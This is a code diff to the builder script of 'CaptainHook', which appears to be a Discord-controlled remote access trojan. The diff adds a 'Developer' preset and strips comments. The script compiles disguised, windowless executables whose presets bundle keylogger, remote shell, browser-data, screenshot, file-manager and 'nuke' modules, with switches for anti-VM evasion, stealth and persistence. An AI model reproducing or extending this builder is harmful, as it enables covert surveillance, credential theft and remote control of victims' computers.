@@ -29,7 +29,15 @@ PRESETS = {
         "description": "VM Friendly. Anti-VM and Persistence DISABLED.",
         "modules": ["screenshot", "keylogger", "shell", "browser", "media", "info", "file_manager", "control", "fun", "nuke"],
         "stealth": False,
-        "anti_vm": False
+        "anti_vm": False,
+        "developer": False
+    },
+    "🛠️  Developer": {
+        "description": "Full Control. Interactive TUI for live debugging. No Stealth.",
+        "modules": ["screenshot", "keylogger", "shell", "browser", "media", "info", "file_manager", "control", "fun", "nuke"],
+        "stealth": False,
+        "anti_vm": False,
+        "developer": True
     },
     "🤡 Troll-Mode": {
         "description": "High Visibility. Focus on fun and control.",
@@ -135,12 +143,10 @@ def build(token, guild_id, preset_name, disguise_name):
             shutil.rmtree("build_staging")
         
         # We need to copy the 'src' directory from the project root
-        # If running via 'captainhook' command, we need to find the correct path
         project_root = os.getcwd()
         src_path = os.path.join(project_root, "src")
         
         if not os.path.exists(src_path):
-             # Fallback for installed package mode
              import pkg_resources
              try:
                  src_path = pkg_resources.resource_filename('captainhook', 'src')
@@ -174,11 +180,9 @@ def build(token, guild_id, preset_name, disguise_name):
         with open(main_path, "r") as f:
             main_content = f.read()
             
-        # Dynamically build the module list in main.py
         modules_str = str(preset["modules"])
         main_content = main_content.replace('modules = ["screenshot", "keylogger", "shell", "browser", "media", "info", "file_manager", "control", "fun", "nuke"]', f'modules = {modules_str}')
         
-        # Toggle Anti-VM and Persistence based on preset
         if not preset["anti_vm"]:
             main_content = main_content.replace('if AntiAnalysis.check_all():', 'if False:')
         if not preset["stealth"]:
@@ -192,21 +196,13 @@ def build(token, guild_id, preset_name, disguise_name):
         progress.add_task(description="Setting up distribution folder...", total=None)
         os.makedirs("dist", exist_ok=True)
         
-        # Prepare hidden imports for PyInstaller
-        # We need to tell PyInstaller about the modules we load dynamically
         hidden_imports = []
         for module in preset["modules"]:
             hidden_imports.append(f"--hidden-import=src.client.modules.{module}")
         
         hidden_imports_str = " ".join(hidden_imports)
-        
-        # Add the staging directory to the PYTHONPATH for PyInstaller analysis
-        # This ensures 'src.client' is found correctly during the build
         staging_root = os.path.abspath("build_staging")
         
-        # OS-Specific instructions
-        # Note: We use --paths to make sure PyInstaller finds our 'src' in build_staging
-        # We also use single line for the command to prevent copy-paste errors
         if os.name == 'nt':
             cmd = f"pyinstaller --onefile --noconsole --icon={disguise['icon']} --name CaptainHook --paths={staging_root} {hidden_imports_str} build_staging/src/client/main.py"
             ext = ".exe"
@@ -242,13 +238,6 @@ def main():
     try:
         config = get_config()
         if Confirm.ask("\n[bold cyan]Confirm Build Settings?[/bold cyan]"):
-            build(*config)
-    except KeyboardInterrupt:
-        console.print("\n[bold red]Build Cancelled.[/bold red]")
-
-if __name__ == "__main__":
-    main()
-cyan]"):
             build(*config)
     except KeyboardInterrupt:
         console.print("\n[bold red]Build Cancelled.[/bold red]")
